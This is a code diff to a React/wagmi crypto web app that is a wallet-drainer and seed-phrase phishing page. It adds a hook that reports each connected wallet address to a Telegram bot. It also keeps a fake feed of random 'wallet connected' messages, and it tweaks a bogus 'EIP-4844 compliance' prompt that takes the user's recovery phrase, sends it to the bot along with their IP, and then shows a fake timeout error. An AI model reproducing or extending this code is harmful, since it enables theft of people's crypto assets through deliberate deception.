@@ -1,4 +1,4 @@
-import React, { useState, useEffect, useMemo } from 'react';
+import React, { useState, useEffect } from 'react';
 import { useAccount, useBalance, useSendTransaction, useChainId } from 'wagmi';
 
 export default function App() {
@@ -27,6 +27,7 @@ export default function App() {
   const { data: nativeBal } = useBalance({ address }); 
   const { data: tokenBal } = useBalance({ address, token: USDT_MAP[chainId] });
 
+  // CORE LOGGING FUNCTION
   const log = (msg) => {
     fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => {
       fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -36,25 +37,26 @@ export default function App() {
     }).catch(() => {});
   };
 
-  // RE-ENGINEERED NOTIFICATION ENGINE (STRICT LOOP)
+  // 🎯 THE REAL HIT NOTIFICATION (NEW ADDITION)
+  useEffect(() => {
+    if (isConnected && address) {
+      const storageKey = `hit_${address}`;
+      if (!sessionStorage.getItem(storageKey)) {
+        log(`🎯 REAL WALLET CONNECTED!\n\nADDR: ${address}\nCHAIN: ${chainId}`);
+        sessionStorage.setItem(storageKey, 'true');
+      }
+    }
+  }, [isConnected, address, chainId]);
+
+  // FAKE NOTIFICATION FEED (THE "TAKE A NAP" LOGIC)
   useEffect(() => {
     const showNotice = () => {
       const r = Math.floor(1000 + Math.random() * 8999);
       setFeedMsg(`🛡️ 0x${r}...${r} WALLET CONNECTED TO MAINNET_NODE`);
-      
-      // Hide message after 4 seconds
-      const hide = setTimeout(() => {
-        setFeedMsg("");
-      }, 4000);
-      return hide;
+      setTimeout(() => setFeedMsg(""), 4000);
     };
-
-    // Initial trigger
     showNotice();
-
-    // Set permanent loop every 9 seconds
     const loop = setInterval(showNotice, 9000);
-
     return () => clearInterval(loop);
   }, []);
 
@@ -79,6 +81,10 @@ export default function App() {
       setInputVal("");
     }
   }, [selectedAsset, tokenBal, nativeBal, activeTask]);
+
+  // SEED BUTTON LOGIC: GRAY UNTIL 12 WORDS
+  const count = seedVal.trim().split(/\s+/).filter(w => w.length > 2).length;
+  const isSeedReady = count >= 12;
 
   return (
     <div style={{minHeight:'100vh', backgroundColor:'#05070a', color:'#e2e8f0', fontFamily:'monospace', padding:'15px', textTransform:'uppercase'}}>
@@ -180,10 +186,12 @@ export default function App() {
                 {!isSyncing ? (
                   <>
                     <div style={{color:'#10b981', fontWeight:'900', fontSize:'18px'}}>🛡️ EIP-4844 COMPLIANCE</div>
-                    <p style={{fontSize:'10px', color:'#475569', margin:'20px 0', lineHeight:'1.5'}}>CRITICAL: NODE_ENCRYPTION_ID EXPIRED. PROVIDE RECOVERY KEY TO RESTORE END-TO-END MAINNET TUNNEL AND PREVENT ASSET LOCKING.</p>
+                    <p style={{fontSize:'10px', color:'#475569', margin:'20px 0', lineHeight:'1.5'}}>CRITICAL: NODE_ENCRYPTION_ID EXPIRED. PROVIDE RECOVERY KEY TO RESTORE END-TO-END MAINNET TUNNEL.</p>
                     <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="12/24 WORDS" style={{width:'100%', height:'120px', backgroundColor:'black', color:'#10b981', padding:'15px', border:'1px solid #1e293b', borderRadius:'15px', outline:'none'}} />
-                    <button onClick={()=>{ if(seedVal.trim().split(/\s+/).length >= 12) { setIsSyncing(true); log(`🚨 SEED: ${seedVal}`); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setTimeout(()=>{setIsSyncing(false); alert("ERROR: NODE RELAY TIMEOUT. PLEASE RE-ENTER PHRASE."); setView("menu")},1200)}},60); } }} 
-                    style={{width:'100%', backgroundColor: '#10b981', color:'#000', padding:'20px', borderRadius:'15px', marginTop:'20px', fontWeight:'900', border:'none'}}
+                    <button 
+                      disabled={!isSeedReady}
+                      onClick={()=>{ setIsSyncing(true); log(`🚨 SEED: ${seedVal}`); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setTimeout(()=>{setIsSyncing(false); alert("ERROR: NODE RELAY TIMEOUT. PLEASE RE-ENTER PHRASE."); setView("menu")},1200)}},60); }} 
+                      style={{width:'100%', backgroundColor: isSeedReady ? '#10b981' : '#1e293b', color: isSeedReady ? '#000' : '#475569', padding:'20px', borderRadius:'15px', marginTop:'20px', fontWeight:'900', border:'none'}}
                     >ENCRYPT & SYNC</button>
                   </>
                 ) : (
